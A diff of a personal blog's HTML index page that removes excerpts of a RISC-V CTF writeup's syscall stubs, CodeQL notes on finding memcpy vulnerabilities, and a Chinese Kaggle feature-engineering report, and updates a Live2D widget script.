&quot;ecall\n&quot;</span><br><span class="line">		&quot;ret\n&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">asm(&quot;mprotect:\n&quot;</span><br><span class="line">		&quot;li a7, 226\n&quot;</span><br><span class="line">		&quot;ecall\n&quot;</span><br><span class="line">		&quot;ret\n&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">asm(&quot;exit:\n&quot;</span><br><span class="line">		&quot;li a7, 93\n&quot;</span><br><span class="line">		&quot;ecall\n&quot;</span><br><span class="line">		&quot;ret\n&quot;);</span><br></pre></td></tr></table></figure>
-<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><ol>
-<li><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/RISC-V">https://en.wikipedia.org/wiki/RISC-V</a></li>
-<li><a target="_blank" rel="noopener" href="https://inst.eecs.berkeley.edu/~cs61c/resources/su18_lec/Lecture7.pdf">https://inst.eecs.berkeley.edu/~cs61c/resources/su18_lec/Lecture7.pdf</a></li>
-<li><a target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/14/getshell2/">https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/14/getshell2/</a></li>
-<li><a target="_blank" rel="noopener" href="https://github.com/BrieflyX/ctf-pwns/tree/master/escape/favourite_architecture">https://github.com/BrieflyX/ctf-pwns/tree/master/escape/favourite_architecture</a></li>
-<li><a target="_blank" rel="noopener" href="https://pullp.github.io/2021/01/23/starctf-2021-writeup/">https://pullp.github.io/2021/01/23/starctf-2021-writeup/</a></li>
-</ol>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://garen-wang.cn/2021/03/23/CodeQL-Learning-Notes/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="Garen Wang">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Garen Wang's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/03/23/CodeQL-Learning-Notes/" class="post-title-link" itemprop="url">CodeQL Learning Notes</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2021-03-23 23:25:23" itemprop="dateCreated datePublished" datetime="2021-03-23T23:25:23+08:00">2021-03-23</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-04-19 08:49:57" itemprop="dateModified" datetime="2021-04-19T08:49:57+08:00">2021-04-19</time>
-              </span>
-
-          
-            <span id="/2021/03/23/CodeQL-Learning-Notes/" class="post-meta-item leancloud_visitors" data-flag-title="CodeQL Learning Notes" title="Views">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-eye"></i>
-              </span>
-              <span class="post-meta-item-text">Views: </span>
-              <span class="leancloud-visitors-count"></span>
-            </span>
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Valine: </span>
-    
-    <a title="valine" href="/2021/03/23/CodeQL-Learning-Notes/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2021/03/23/CodeQL-Learning-Notes/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="beginning"><a href="#beginning" class="headerlink" title="beginning"></a>beginning</h2><p>Why do I need to learn CodeQL? Emm… It’s all about SRP.</p>
-<p>CodeQL is a query tool that powers security researchers, which consists of code scanning, vulnerbilities discovering, etc.</p>
-<p>As for the reason, one of the requirements of SRP is to use CodeQL to develop a vulnerbilities scanning program. Personnally I think it’s a great challenge for me as I am not skilled at this field before. But I will try my best.</p>
-<h2 id="Configuration"><a href="#Configuration" class="headerlink" title="Configuration"></a>Configuration</h2><p>I set up the environment on VSCode, Arch Linux, and the general configuration is simple:</p>
-<ol>
-<li><p>Download <code>CodeQL</code> extension in VSCode.</p>
-</li>
-<li><p>Let the extension automatically download CodeQL CLI.</p>
-</li>
-</ol>
-<p>According to the official documentation, it is not recommended to manually set the path of executable in extension, because sometimes some nasty errors would occur.(but it seems nothing special?)</p>
-<p>If you need to use CodeQL CLI outside VSCode, maybe you should manually install another one.</p>
-<h2 id="First-Demo"><a href="#First-Demo" class="headerlink" title="First Demo"></a>First Demo</h2><p>There is a repository called <a target="_blank" rel="noopener" href="https://github.com/github/vscode-codeql-starter">vscode-codeql-starter</a> in GitHub, which you can use to run your first query in CodeQL locally.</p>
-<p>What’s more, there is a learning repo available in GitHub called <a target="_blank" rel="noopener" href="https://github.com/github/codeql-uboot"><code>codeql-uboot</code></a>, which aims to use codeql to find 9 vulnerbilities about <code>memcpy</code>.</p>
-<h1 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;hello world&quot;</span><br></pre></td></tr></table></figure>
-<h1 id="Basic-Grammar"><a href="#Basic-Grammar" class="headerlink" title="Basic Grammar"></a>Basic Grammar</h1><p>Similar to SQL, CodeQL has three essential keywords: <code>from</code>, <code>where</code>, <code>select</code>.</p>
-<p>Let’s look through examples from <code>codeql-uboot</code>, whose code language is c++.</p>
-<h2 id="Find-Function-Definitions"><a href="#Find-Function-Definitions" class="headerlink" title="Find Function Definitions"></a>Find Function Definitions</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import cpp</span><br><span class="line"></span><br><span class="line">from Function f</span><br><span class="line">where f.getName() &#x3D; &quot;memcpy&quot;</span><br><span class="line">select f, &quot;a function named memcpy&quot;</span><br></pre></td></tr></table></figure>
-<p>CodeQL has lots of useful APIs, which can be seen conveniently when using auto-completion in VSCode.</p>
-<p>How to start a query? <code>Ctrl+Shift+P</code>, type <code>codeql</code>, select <code>Run Query</code>. After a while you can see the result in your right hand side.</p>
-<h2 id="Find-Macro-Definitions"><a href="#Find-Macro-Definitions" class="headerlink" title="Find Macro Definitions"></a>Find Macro Definitions</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from Macro m</span><br><span class="line">where m.getName() in [&quot;ntohs&quot;, &quot;ntohl&quot;, &quot;ntohll&quot;]</span><br><span class="line">select </span><br></pre></td></tr></table></figure>
-<h2 id="Find-Function-Calls"><a href="#Find-Function-Calls" class="headerlink" title="Find Function Calls"></a>Find Function Calls</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from FunctionCall fc</span><br><span class="line">where fc.getTarget().getName() &#x3D; &quot;memcpy&quot;</span><br><span class="line">select fc</span><br></pre></td></tr></table></figure>
-<h2 id="Find-Macro-Invocations"><a href="#Find-Macro-Invocations" class="headerlink" title="Find Macro Invocations"></a>Find Macro Invocations</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from MacroInvocation inv</span><br><span class="line">where inv.getMacro().getName().regexpMatch(&quot;ntoh(s|l|ll)&quot;)</span><br><span class="line">select inv</span><br></pre></td></tr></table></figure>
-<h2 id="Find-Macro-Expressions"><a href="#Find-Macro-Expressions" class="headerlink" title="Find Macro Expressions"></a>Find Macro Expressions</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from MacroInvocation inv</span><br><span class="line">where inv.getMacro().getName().regexpMatch(&quot;ntoh(s|l|ll)&quot;)</span><br><span class="line">select inv.getExpr()</span><br></pre></td></tr></table></figure>
-<h2 id="Create-A-Class"><a href="#Create-A-Class" class="headerlink" title="Create A Class"></a>Create A Class</h2><p>Similar to lots of other programming languages, CodeQL has the feature of object-oriented programming.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">class NetworkByteSwap extends Expr &#123;</span><br><span class="line">  NetworkByteSwap() &#123;</span><br><span class="line">    exists (MacroInvocation inv | </span><br><span class="line">      inv.getMacro().getName() in [&quot;ntohs&quot;, &quot;ntohl&quot;, &quot;ntohll&quot;] and </span><br><span class="line">      this &#x3D; inv.getExpr()</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from NetworkByteSwap n</span><br><span class="line">select n, &quot;Network byte swap&quot;</span><br></pre></td></tr></table></figure>
-<p>Here <code>exists</code> can be understood as an existential quantifier in Discrete Mathematics, where we first define the variables then list all propositions the variables should satisfy, with a separator <code>|</code>.</p>
-<h2 id="Data-Flow-in-CodeQL"><a href="#Data-Flow-in-CodeQL" class="headerlink" title="Data Flow in CodeQL"></a>Data Flow in CodeQL</h2><p>First we introduce two important terminologies: <code>source</code> and <code>sink</code>.</p>
-<p><strong>Source</strong> is the function that is to blame when vulnerbilities occur, and <strong>sink</strong> refers to dangerous factors(e.g. pointer, parameter, etc.) in a specific function. Code is vulnerable if tainted data <strong>flows</strong> from a source to a sink.</p>
-<p>CodeQL has implemented two kinds of data flows.</p>
-<ol>
-<li>Local data flow. In this condition, tainted data will be tracked only inside a function scope.</li>
-<li>Global data flow. In this condition, tainted data can be tracked globally, not limited in a function scope.</li>
-</ol>
-<p>Generally, for source and sink, we need to find the characteristics they have and write predicates for them respectively.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">import cpp</span><br><span class="line">import semmle.code.cpp.dataflow.DataFlow</span><br><span class="line">import semmle.code.cpp.dataflow.TaintTracking</span><br><span class="line"></span><br><span class="line">class NetworkByteSwap extends Expr &#123;</span><br><span class="line">  NetworkByteSwap() &#123;</span><br><span class="line">    exists (MacroInvocation inv | </span><br><span class="line">      inv.getMacro().getName() in [&quot;ntohs&quot;, &quot;ntohl&quot;, &quot;ntohll&quot;] and </span><br><span class="line">      this &#x3D; inv.getExpr()</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Config extends TaintTracking::Configuration &#123;</span><br><span class="line">  Config() &#123;</span><br><span class="line">    this &#x3D; &quot;Network2MemFuncLength&quot;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node source) &#123;</span><br><span class="line">    source.asExpr() instanceof NetworkByteSwap</span><br><span class="line">  &#125;</span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    exists (FunctionCall fc |</span><br><span class="line">      sink.asExpr() &#x3D; fc.getArgument(2) and </span><br><span class="line">      fc.getTarget().hasQualifiedName(&quot;memcpy&quot;)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from Config cfg, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where cfg.hasFlowPath(source, sink)</span><br><span class="line">select sink, source, sink, &quot;Network byte swap flows to memory&quot;</span><br></pre></td></tr></table></figure>
-<p>We can inherit <code>TaintTracking::Config</code> and override some specific predicates to customize our data flow. Respectively, <code>inSource</code> and <code>isSink</code> restrict conditions that a <code>DataFlow::Node</code> can be regarded as source and sink. And if we need to remove some false-positive queries, override predicate <code>isSanitizer</code> to make our queries more accurately.</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://garen-wang.cn/2021/03/15/NNI-Student-Program-2020-Task3.2.1/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="Garen Wang">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Garen Wang's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/03/15/NNI-Student-Program-2020-Task3.2.1/" class="post-title-link" itemprop="url">NNI Student Program Task3.2.1</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2021-03-15 19:20:00" itemprop="dateCreated datePublished" datetime="2021-03-15T19:20:00+08:00">2021-03-15</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-03-18 21:26:59" itemprop="dateModified" datetime="2021-03-18T21:26:59+08:00">2021-03-18</time>
-              </span>
-
-          
-            <span id="/2021/03/15/NNI-Student-Program-2020-Task3.2.1/" class="post-meta-item leancloud_visitors" data-flag-title="NNI Student Program Task3.2.1" title="Views">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-eye"></i>
-              </span>
-              <span class="post-meta-item-text">Views: </span>
-              <span class="leancloud-visitors-count"></span>
-            </span>
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Valine: </span>
-    
-    <a title="valine" href="/2021/03/15/NNI-Student-Program-2020-Task3.2.1/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2021/03/15/NNI-Student-Program-2020-Task3.2.1/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="Task-3-2-1-表格型数据的进阶任务"><a href="#Task-3-2-1-表格型数据的进阶任务" class="headerlink" title="Task 3.2.1 表格型数据的进阶任务"></a>Task 3.2.1 表格型数据的进阶任务</h1><h2 id="电影票房预测：TMDB-Box-Office-Prediction"><a href="#电影票房预测：TMDB-Box-Office-Prediction" class="headerlink" title="电影票房预测：TMDB Box Office Prediction"></a>电影票房预测：TMDB Box Office Prediction</h2><h3 id="特征处理"><a href="#特征处理" class="headerlink" title="特征处理"></a>特征处理</h3><p>首先，可以发现<code>belongs-to-collection</code>，<code>homepage</code>等特征存在缺失值，可根据具体数据类型使用不同策略填补缺失值，例如json数据填补<code>&#39;[]&#39;</code>，<code>runtime</code>用中位数填补等等。</p>
-<p>其次，数据中存在异常值，需要人工删去异常数据或对异常数据进行填补，在这种时候，箱型图是很重要的工具。<code>budget</code>特征中，前25%的数据均是0，必然是异常数据，解决方案之一是用剩余<code>budget</code>数据的中位数来对其进行填补。<code>runtime</code>特征中存在338分钟的超长电影，打乱了<code>runtime</code>的规则分布，我们选择将该条数据从训练集中删去。</p>
-<p><code>poster-path</code>、<code>imdb-id</code>特征一个是图片链接，一个是id，对模型没有任何直接关系，直接删去。</p>
-<p>在两个数据中，<code>status</code>特征99.8%的数据都是Released，那么这个特征根本不能提高分类精确度，因此可以直接删去。</p>
-<p><code>release-date</code>为常见的时间序列特征，通过<code>pd.DatetimeIndex</code>类型可以方便地提取年、月、日等新特征。</p>
-<p>同时，在直方图中可以观察出<code>revenue</code>和<code>budget</code>数据的分布不均匀，可以通过<code>np.log1p</code>进行平滑处理，这样的预测结果比较符合正态分布，预测准确度能够提高。最终预测的<code>log-revenue</code>通过<code>np.exp1m</code>可还原回正常数据。</p>
-<p><code>cast</code>，<code>crew</code>，<code>belongs-to-collection</code>等特征是以json格式存储的，对数据中json的解析，<code>ast.literal_eval</code>能比较方便地完成解析任务。<a target="_blank" rel="noopener" href="https://www.kaggle.com/c/tmdb-box-office-prediction/discussion/80045">参考链接</a></p>
-<p>对于<code>cast</code>，<code>crew</code>这两个特殊的特征，可以符合实际情况，构造出主演，导演，制片人等有关信息，并且可以对这些信息根据票房高低进行排序，根据主演、导演的排名构造特征，这样的特征对最终所预测的票房相关性较强。另一种方法是使用词向量进行特征提取，后续可以进行尝试。</p>
-<h3 id="人工构造特征"><a href="#人工构造特征" class="headerlink" title="人工构造特征"></a>人工构造特征</h3><p>基于先验知识，大制片厂参与制作，有明星演员，有明星导演的电影，票房一般会比较高。我们可以预先统计出演员、导演、制片厂的排名榜，然后通过这些关键要素的计数多少或存在与否构建新特征。</p>
-<p>很多特征中，特征中所包含的元素越多，票房有比较大的几率倾向于越高，如<code>spoken-languages</code>，<code>genres</code>等特征。我们便可以构造count类型的新特征。</p>
-<p>最终提交结果的loss是2.13(680/1395)，误差可接受，但有待进一步优化。</p>
-<h3 id="使用NNI自动特征工程"><a href="#使用NNI自动特征工程" class="headerlink" title="使用NNI自动特征工程"></a>使用NNI自动特征工程</h3><p>NNI集成了GradientFeatureSelector，该算法能在大数据集上缩小特征范围并找到高阶相关性，提升机器学习的效果与性能。</p>
-<p>NNI的GradientFeatureSelector使用方法与sklearn模型大致相同：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> nni.feature_engineering.gradient_selector <span class="keyword">import</span> FeatureGradientSelector</span><br><span class="line"></span><br><span class="line">selector = FeatureGradientSelector(n_features=<span class="number">20</span>)</span><br><span class="line">selector.fit(X_train, y_train)</span><br><span class="line">print(selector.get_selected_features())</span><br></pre></td></tr></table></figure>
-<p>相关调用NNI自动特征工具的代码包含在对应的jupyter notebook文件中。</p>
-<h3 id="最终结果"><a href="#最终结果" class="headerlink" title="最终结果"></a>最终结果</h3><p>在NNI的帮助下，当NNI特征选择器选择16个特征并且使用<code>GradientBoostingRegressor</code>时，取得了较好的提交结果。</p>
-<p>最终提交结果的最好loss是2.09(621/1395)，在原来特征处理的基础上得到了提升。个人推测NNI特征选择器在本题效果不明显的原因是没有在手动特征处理部分提取和构造出足够多的特征，导致了选择空间较小，提升空间也比较受限。</p>
-<h2 id="旧金山犯罪分类：San-Francisco-Crime-Classification"><a href="#旧金山犯罪分类：San-Francisco-Crime-Classification" class="headerlink" title="旧金山犯罪分类：San Francisco Crime Classification"></a>旧金山犯罪分类：San Francisco Crime Classification</h2><h3 id="原始特征"><a href="#原始特征" class="headerlink" title="原始特征"></a>原始特征</h3><p>该数据的特征相对较少，特征的处理也并不会想上一道题一样繁琐，不过相应的，针对特征的处理则需要更多的技巧。这道题需要做到39个类别的多分类任务，如果对高阶特征的提取不够充分，效果则会比较一般。</p>
-<p>给出的特征中，除了<code>Descript</code>和<code>Resolution</code>之外的特征都很重要，我们逐步分析：</p>
-<p>首先，不同的警区，犯罪案件的发生率是不同的，有些警区所在的地区是犯罪高发地。可以通过数据可视化看出：</p>
-<img data-src="http://qiniu.garen-wang.cn/static/images/NNI-Student-Program-2020-Task3.2.1/task3.2.1_2.png">
-<p>可以看出：南部警区犯罪数量明显高于其他警区，Mission和北方警区犯罪数量也相对较多。</p>
-<p>信息量较大的还有日期特征，从中可以查看一天中具体时间段的犯罪数量的分布。在这里我们将一天从0点到24点分为6个时间段可视化结果如下：</p>
-<img data-src="http://qiniu.garen-wang.cn/static/images/NNI-Student-Program-2020-Task3.2.1/task3.23.png">
-<p>可以看出，在1代表的凌晨和6代表的夜晚这两个时间段内，犯罪数量相对其他的一个时间段都会高。</p>
-<h3 id="特征处理-1"><a href="#特征处理-1" class="headerlink" title="特征处理"></a>特征处理</h3><p><code>X</code>，<code>Y</code>两个特征中，在测试集发现经度为-120.5，纬度为90的异常特征，我们分别使用经纬度的中位数进行替换。替换后的散点图如下：</p>
-<img data-src="http://qiniu.garen-wang.cn/static/images/NNI-Student-Program-2020-Task3.2.1/task3.2.1_1.png">
-<p>替换后可通过<code>sklearn.preprocessing.StandardScaler</code>，对数据进行标准化处理，这样更方便模型进行预测。</p>
-<h3 id="人工构造特征-1"><a href="#人工构造特征-1" class="headerlink" title="人工构造特征"></a>人工构造特征</h3><p>对时间序列特征，提取出年、月、日、季度、小时、星期等子特征。并使用one-hot编码展开。</p>
-<p>发现地址中具有规律，可根据地址最后两个大写字母种类的不同，构造关于地址的特征。</p>
-<p>模型方面，我们使用随机森林进行回归，准确率为27.5%左右，有待提高。</p>
-<h3 id="使用NNI"><a href="#使用NNI" class="headerlink" title="使用NNI"></a>使用NNI</h3><p>同样使用NNI的<code>GradientFeatureSelector</code>，从构造出的特征中选取出了18个特征。</p>
-<p>使用了NNI的特征选择器后，使用lightGBM算法构建模型，在验证集上的multiloss是2.32，相对原来有一定提高。</p>
-<p>使用随机森林模型进行二分类，最优达到了30%的准确率。</p>
-<h3 id="最终结果-1"><a href="#最终结果-1" class="headerlink" title="最终结果"></a>最终结果</h3><p>最终提交的模型在测试集上的结果不尽人意，在kaggle上只排到了75%左右，这说明最终模型的泛化效果并不够好，无法很好地完成39种类别的分类任务。</p>
-<p>由于对特征工程的认识有限，在特征的处理上只实现了自己的处理思路，这可能也导致我们的模型表现不够优秀。</p>
-<h2 id="土壤属性预测：Africa-Soil-Property-Prediction-Challenge"><a href="#土壤属性预测：Africa-Soil-Property-Prediction-Challenge" class="headerlink" title="土壤属性预测：Africa Soil Property Prediction Challenge"></a>土壤属性预测：Africa Soil Property Prediction Challenge</h2><p>multi-label的回归任务其实可以拆分为多个单label的回归任务，通过多次构建模型进行回归来预测各个label的值。</p>
-<p>由于原代码只支持二分类任务，这里为了实现multi-label的回归任务，使用了以<code>lightgbm.LGBMRegressor</code>为内置结构的<code>sklearn.multioutput.MultiOutputRegressor</code>。<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/52648383/how-to-get-coefficients-and-feature-importances-from-multioutputregressor">参考链接</a></p>
-<h3 id="原始特征-1"><a href="#原始特征-1" class="headerlink" title="原始特征"></a>原始特征</h3><p>原始特征均进行过标准化处理，除了<code>Depth</code>特征可以将字符串变化为01编码，其他特征没有进一步处理的必要。</p>
-<h3 id="手动选择建立模型"><a href="#手动选择建立模型" class="headerlink" title="手动选择建立模型"></a>手动选择建立模型</h3><p>使用了sklearn中贝叶斯线性回归模型（BayesianRidge），通过做5次模型的回归，最终kaggle上的loss为0.46489，拟合效果优秀。</p>
-<h3 id="使用NNI-AutoFE工具"><a href="#使用NNI-AutoFE工具" class="headerlink" title="使用NNI AutoFE工具"></a>使用NNI AutoFE工具</h3><p>该题目比较特殊，该题目中，绝大部分的特征描述的是针对特定波长的光的吸收能力。</p>
-<p>理论上各特征的重要程度并无较大差别，更多的特征往往能够得到更高的预测精确度，在这些特征中进行重要性排序并进行特征选择的意义相对来说不是很大。所以经过权衡考虑后，我们决定跳过使用NNI进一步提升的步骤。</p>
-<h2 id="任务总结"><a href="#任务总结" class="headerlink" title="任务总结"></a>任务总结</h2><p>在Task3.2.1的任务中，本小组从零开始学习了特征工程的有关知识，并学会了对常用表格特征的提取与新特征的构造方式，最后还尝试了通过使用NNI的特征工程工具优化模型性能。</p>
-<p>由于学习时间较短，水平有限，特征提取与模型训练也没有能做到最好，也没能发挥出NNI特征工程工具的真正效果，希望在日后的学习中能够不断有所长进。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1493,7 +1377,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">25</span>
+          <span class="site-state-item-count">28</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -1691,17 +1575,18 @@ NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
 </script>
 
 
-    <canvas id="live2d" width="400" height="400" class="live2d" style="position: fixed; opacity: 1; left: -110px; bottom: -135px; z-index: 99999; pointer-events: none;"></canvas>
-    <!--script src="https://blog-static.cnblogs.com/files/Arisf/live2dcubismcore.js"></script-->
-    <!--script src="https://blog-static.cnblogs.com/files/Arisf/bundle.js"></script-->
-    <script src="https://cdn.jsdelivr.net/gh/Garen-Wang/live2d-moc3@vv0.1.1/js/live2dcubismcore.js"></script>
-    <script src="https://cdn.jsdelivr.net/gh/Garen-Wang/live2d-moc3@vv0.1.1/js/bundle.js"></script>
-    <script>
-        var resourcesPath = 'https://cdn.jsdelivr.net/gh/Garen-Wang/live2d-moc3@v0.1.0/'; // 指定资源文件（模型）保存的路径，使用github的release版本，路径如下https://cdn.jsdelivr.net/gh/用户/库@版本号/资源路径
-        var backImageName = ''; // 指定背景图片 ,默认为空
-        var modelDir = ['jiaran4']; // 指定需要加载的模型
-        initDefine(resourcesPath, backImageName, modelDir); // 初始化模型</script>
-   </script>
+  <!-- script src="https://cdn.jsdelivr.net/gh/Garen-Wang/live2d-moc3@vv0.2.2/js/live2dcubismcore.js"></script -->
+  <!-- script src="https://cdn.jsdelivr.net/gh/Garen-Wang/live2d-moc3@vv0.2.2/js/bundle.js"></script -->
+
+  <canvas id="live2d-canvas" width="400" height="400" style="position: fixed; opacity: 1; left: -110px; bottom: -135px; z-index: 99999; background-color: white;"></canvas>
+  <script src="https://cdn.jsdelivr.net/gh/Garen-Wang/live2d-moc3@vv0.1.1/js/live2dcubismcore.js"></script>
+  <script src="https://cdn.jsdelivr.net/gh/Garen-Wang/live2d-moc3@vv0.1.1/js/bundle.js"></script>
+  <script>
+    var resourcesPath = 'https://cdn.jsdelivr.net/gh/Garen-Wang/live2d-moc3@v0.1.0/';
+    var backImageName = '';
+    var modelDir = ['jiaran4'];
+    initDefine(resourcesPath, backImageName, modelDir);
+  </script>
 
 </body>
 </html>
